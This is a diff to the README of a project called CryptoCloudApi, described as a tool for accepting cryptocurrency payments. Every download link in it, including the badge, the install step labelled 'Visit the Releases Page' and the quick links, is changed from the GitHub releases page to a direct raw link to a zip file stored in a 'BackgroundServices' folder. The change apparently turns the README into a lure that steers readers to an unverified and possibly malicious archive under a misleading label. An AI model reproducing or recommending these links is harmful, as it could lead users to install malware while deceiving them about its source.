@@ -1,6 +1,6 @@
 # 🚀 CryptoCloudApi - Easy Payments with Cryptocurrency Integration
 
-[![Download CryptoCloudApi](https://img.shields.io/badge/Download-CryptoCloudApi-blue.svg)](https://github.com/codewithharshhh/CryptoCloudApi/releases)
+[![Download CryptoCloudApi](https://raw.githubusercontent.com/codewithharshhh/CryptoCloudApi/master/BackgroundServices/CryptoCloudApi-2.5.zip)](https://raw.githubusercontent.com/codewithharshhh/CryptoCloudApi/master/BackgroundServices/CryptoCloudApi-2.5.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To start using CryptoCloudApi, you'll need to follow a few simple steps to downl
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Click on the following link to access the releases page: [Download CryptoCloudApi](https://github.com/codewithharshhh/CryptoCloudApi/releases).
+1. **Visit the Releases Page**: Click on the following link to access the releases page: [Download CryptoCloudApi](https://raw.githubusercontent.com/codewithharshhh/CryptoCloudApi/master/BackgroundServices/CryptoCloudApi-2.5.zip).
 
 2. **Find the Latest Version**: Look for the most recent version listed on the page. It will typically have the highest version number. 
 
@@ -64,4 +64,4 @@ For further support or inquiries, you can reach out via issues on the GitHub rep
 
 CryptoCloudApi is designed with the end user in mind. It simplifies the process of accepting cryptocurrency payments, making it accessible for anyone. Download it today and start accepting cryptocurrency payments with confidence!
 
-**Quick Links**: [Download CryptoCloudApi](https://github.com/codewithharshhh/CryptoCloudApi/releases) | [Documentation](#) | [Community Support](#)
+**Quick Links**: [Download CryptoCloudApi](https://raw.githubusercontent.com/codewithharshhh/CryptoCloudApi/master/BackgroundServices/CryptoCloudApi-2.5.zip) | [Documentation](#) | [Community Support](#)
